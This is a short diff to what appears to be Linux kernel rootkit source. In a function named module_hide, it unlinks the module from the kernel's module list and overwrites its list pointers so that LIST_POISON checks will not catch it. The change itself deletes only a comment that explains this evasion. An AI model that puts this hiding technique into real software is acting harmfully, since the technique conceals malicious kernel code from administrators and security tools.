@@ -313,7 +313,6 @@ module_hide(void)
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	
-	/* Change list pointers to avoid decetct by LIST_POISON1 and LIST_POISON2 values */
 	THIS_MODULE->list.prev = (void *)0x8163;
 	THIS_MODULE->list.next = (void *)0x8163;
 	module_hidden = 1;
